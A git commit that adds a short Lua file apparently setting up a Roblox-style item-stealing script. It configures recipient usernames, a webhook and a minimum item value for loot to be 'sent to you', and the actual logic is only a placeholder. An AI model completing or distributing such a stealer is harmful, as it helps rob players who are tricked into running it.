833db4076473cf04d9ceca3972e2d6e50c4119eb
VOIDZ <goldbed145@gmail.com>
2024-12-13 10:21:08 +0800

    Upload new file: VoidScript_367950_note.lua

---
+++ VoidScript_367950_note.lua
@@ -0,0 +1,7 @@
+
+Username = "allat"
+Username2 = "goldbedi46" -- stuff will get sent to this user if the first user's mailbox is full
+webhook = "or allah"
+min_rap = 1000000 -- minimum RAP of each item you want to get sent to you. 1 million by default
+
+-- Add the rest of the script logic here...
